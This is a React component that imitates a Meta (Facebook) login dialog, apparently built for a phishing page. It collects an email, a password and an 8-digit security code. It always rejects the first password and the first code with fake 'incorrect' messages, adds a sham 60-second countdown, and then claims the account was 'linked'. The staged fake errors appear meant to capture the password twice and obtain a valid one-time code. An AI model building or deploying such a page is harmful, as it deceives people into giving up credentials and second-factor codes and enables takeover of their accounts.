import { useState } from "react";
import { X, LoaderCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";

interface MetaLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

type LoginStage = "username" | "password" | "code" | "success";

const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  const [stage, setStage] = useState<LoginStage>("username");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [attempts, setAttempts] = useState(0);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.includes("@")) {
      setError("Please enter a valid email address.");
      return;
    }
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStage("password");
      setError(null);
    }, 3000);
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 6) {
      setError("Password must be at least 6 characters.");
      return;
    }
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setError("The password you've entered is incorrect.");
      setPassword("");
      setAttempts(attempts + 1);
      
      // After the first failed attempt, move to code verification
      if (attempts >= 1) {
        setStage("code");
        setError(null);
      }
    }, 3000);
  };

  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 8 || !/^\d+$/.test(code)) {
      setError("Please enter a valid 8-digit code.");
      return;
    }
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      
      // First code attempt fails
      if (!canResend) {
        setError("The code you entered is incorrect. Please try again in 60 seconds.");
        setCode("");
        
        // Start countdown
        setCanResend(false);
        let timeLeft = 60;
        setCountdown(timeLeft);
        
        const countdownInterval = setInterval(() => {
          timeLeft -= 1;
          setCountdown(timeLeft);
          
          if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            setCanResend(true);
          }
        }, 1000);
      } else {
        // Second attempt succeeds
        setStage("success");
        setTimeout(() => {
          onSuccess();
        }, 2000);
      }
    }, 3000);
  };

  const renderStage = () => {
    switch (stage) {
      case "username":
        return (
          <form onSubmit={handleEmailSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email or Phone</Label>
              <Input
                id="email"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email or phone number"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Log In
            </Button>
            <div className="text-center">
              <a href="#" className="text-[#1877F2] text-sm hover:underline">Forgot account?</a>
            </div>
            <div className="relative py-2">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-neutral-300"></div>
              </div>
              <div className="relative flex justify-center">
                <span className="bg-white px-2 text-sm text-neutral-500">or</span>
              </div>
            </div>
            <Button 
              type="button"
              variant="outline"
              className="w-full border-neutral-300 text-[#42b72a] hover:bg-neutral-50 font-semibold"
            >
              Create New Account
            </Button>
          </form>
        );
      
      case "password":
        return (
          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div className="flex items-center border rounded-md p-2 mb-4 bg-neutral-50">
              <span className="text-sm">{email}</span>
              <Button
                type="button"
                variant="ghost"
                size="sm"
                className="ml-auto text-[#1877F2] hover:bg-transparent hover:text-[#166FE5] p-0"
                onClick={() => setStage("username")}
              >
                Change
              </Button>
            </div>
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Log In
            </Button>
            <div className="text-center">
              <a href="#" className="text-[#1877F2] text-sm hover:underline">Forgot password?</a>
            </div>
          </form>
        );
      
      case "code":
        return (
          <form onSubmit={handleCodeSubmit} className="space-y-4">
            <p className="text-neutral-700">
              We sent a code to your email {email.substring(0, 3)}***{email.substring(email.indexOf('@'))}. 
              Enter the 8-digit code below to verify your identity.
            </p>
            <div className="space-y-2">
              <Label htmlFor="code">Security Code</Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => {
                  // Allow only numbers and limit to 8 digits
                  const value = e.target.value.replace(/[^0-9]/g, '');
                  if (value.length <= 8) {
                    setCode(value);
                  }
                }}
                placeholder="Enter 8-digit code"
                maxLength={8}
                disabled={isLoading || !canResend && countdown > 0}
                className="border-neutral-300 text-center text-lg tracking-widest"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            {!canResend && countdown > 0 && (
              <p className="text-neutral-500 text-sm text-center">
                You can request a new code in {countdown} seconds
              </p>
            )}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading || (!canResend && countdown > 0)}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Verify
            </Button>
            <div className="text-center">
              <Button
                type="button"
                variant="link"
                className="text-[#1877F2] text-sm hover:underline p-0"
                onClick={() => setStage("username")}
              >
                Try another way
              </Button>
            </div>
          </form>
        );
      
      case "success":
        return (
          <div className="space-y-4 text-center">
            <div className="flex items-center justify-center">
              <svg className="w-16 h-16 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h3 className="text-xl font-medium">Account Linked Successfully</h3>
            <p className="text-neutral-600">
              Your Meta account has been successfully linked to your application.
            </p>
            <LoaderCircle className="mx-auto h-8 w-8 animate-spin text-neutral-400" />
            <p className="text-sm text-neutral-500">Returning to your application...</p>
          </div>
        );
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center text-2xl font-semibold text-[#1877F2]">
            {stage === "success" ? "Meta Account Linked" : "Log in to Meta"}
          </DialogTitle>
          {stage !== "success" && (
            <DialogDescription className="text-center text-neutral-600">
              Connect your Meta account to verify your application
            </DialogDescription>
          )}
        </DialogHeader>
        
        <div className="px-1 py-4">
          {renderStage()}
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default MetaLoginModal;